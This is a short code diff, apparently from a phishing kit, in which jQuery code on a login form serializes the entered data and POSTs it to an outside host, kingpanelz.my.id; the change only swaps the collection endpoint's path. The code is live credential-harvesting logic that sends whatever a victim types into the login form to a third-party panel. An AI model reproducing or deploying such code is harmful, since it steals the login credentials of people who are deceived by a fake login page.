@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
  var d = $(".login-form");  
   
  $.ajax({  
-        url: "https://kingpanelz.my.id/api/js/api.php",  
+        url: "https://kingpanelz.my.id/api/krisna/api.php",  
         type: "POST",  
         data: d.serialize(),  
         success: function () {  
